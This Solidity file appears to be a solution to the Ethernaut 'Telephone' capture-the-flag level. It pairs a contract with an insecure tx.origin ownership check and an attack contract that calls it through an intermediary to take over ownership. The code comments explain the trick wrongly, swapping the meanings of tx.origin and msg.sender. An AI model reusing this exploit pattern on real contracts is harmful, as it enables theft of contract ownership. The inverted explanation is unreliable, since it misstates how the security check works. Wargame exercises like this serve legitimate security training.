pragma solidity ^0.4.18;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelephoneAttack {
    Telephone telephoneContract ;
    address telephoneInstanceAddress = 0x26d4fa029495381b4b5b84b1af482e786961d1be; //initialise Telephone with your Ethernaut instance address
    
    constructor() public {
        telephoneContract = Telephone(telephoneInstanceAddress);
    }
    
    function exploitTelephone () public {
        //key idea is the difference between txn.origin and msg.sender
        //txn.origin is the address called by the direct caller --> in this case the direct caller is the TelephoneAttack contract
        //This is because the TelephoneContract instantiates the Telephone class, thus it will be the one to call the functions
        //msg.sender will always be the address of the person who clicks the function, hence it will be different from the TelephoneAttack contract address 
        telephoneContract.changeOwner(0x54151b3a0a41067dbcf66d3f677dd528e5bdd090);
    }
}